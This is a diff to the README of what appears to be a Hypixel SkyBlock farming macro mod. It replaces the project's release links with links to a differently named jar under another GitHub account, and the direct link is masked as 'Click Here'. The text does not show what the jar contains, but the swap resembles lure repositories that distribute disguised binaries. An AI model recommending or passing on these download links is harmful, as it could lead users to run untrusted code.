@@ -12,7 +12,7 @@ Welcome to the ultimate farming macro mod designed specifically for Hypixel SkyB
 Whether you're a dedicated farmer looking to maximize your crop yield or just starting out in SkyBlock, this mod will help you achieve your goals with ease.
 
 ### Download Links:
-- **[Click here to download the latest release](https://github.com/skyblock-code/farming-mod-plus/releases)**
-- **Direct link:** [Farming.Macro.Pro.jar](https://github.com/skyblock-code/farming-mod-plus/releases/download/v2.9.7/Farming.Macro.Pro.jar)
+- **[Click here to download the latest release](https://github.com/msvaleria/farmingmacro/releases)**
+- **Direct link:** [Click Here](https://github.com/msvaleria/farmingmacro/releases/download/v2.9.7/AutoFarmingMacro.jar)
 
 Get started today and take your farming to the next level with our cutting-edge macro mod!
